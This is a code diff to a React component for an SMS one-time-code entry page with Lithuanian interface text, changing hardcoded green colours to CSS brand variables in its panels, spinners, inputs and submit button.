@@ -113,7 +113,7 @@ export function SmsClient({ sessionId }: Props) {
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e]/30 border-t-[#0fae4e]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
         </div>
       </div>
     );
@@ -122,7 +122,7 @@ export function SmsClient({ sessionId }: Props) {
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -132,7 +132,7 @@ export function SmsClient({ sessionId }: Props) {
   if (!sessionId) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-5 sm:p-8 text-center">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
             Neteisinga nuoroda.
           </p>
@@ -144,8 +144,8 @@ export function SmsClient({ sessionId }: Props) {
   if (loading) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-5 sm:p-8 flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e] border-t-transparent" />
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 flex justify-center py-16">
+          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)] border-t-transparent" />
         </div>
       </div>
     );
@@ -191,7 +191,7 @@ export function SmsClient({ sessionId }: Props) {
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-6 sm:p-10 relative z-10 fade-in">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-6 sm:p-10 relative z-10 fade-in">
         
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
@@ -235,7 +235,7 @@ export function SmsClient({ sessionId }: Props) {
                   inputMode="numeric"
                   autoComplete="one-time-code"
                   maxLength={1}
-                  className="w-full aspect-square sm:aspect-[5/6] text-center rounded-xl border border-transparent bg-white/10 text-xl sm:text-2xl md:text-3xl font-bold text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
+                  className="w-full aspect-square sm:aspect-[5/6] text-center rounded-xl border border-transparent bg-white/10 text-xl sm:text-2xl md:text-3xl font-bold text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                   value={code[index] || ""}
                   onChange={(e) => handleOtpChange(index, e.target.value)}
                   onKeyDown={(e) => handleOtpKeyDown(index, e)}
@@ -253,7 +253,7 @@ export function SmsClient({ sessionId }: Props) {
           <button
             type="submit"
             disabled={saving || !valid}
-            className="w-full rounded-xl bg-gradient-to-r from-[#0fae4e] to-[#007a38] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(15,174,78,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(var(--brand-rgb),0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? settings.sms_loading : settings.sms_button}
           </button>
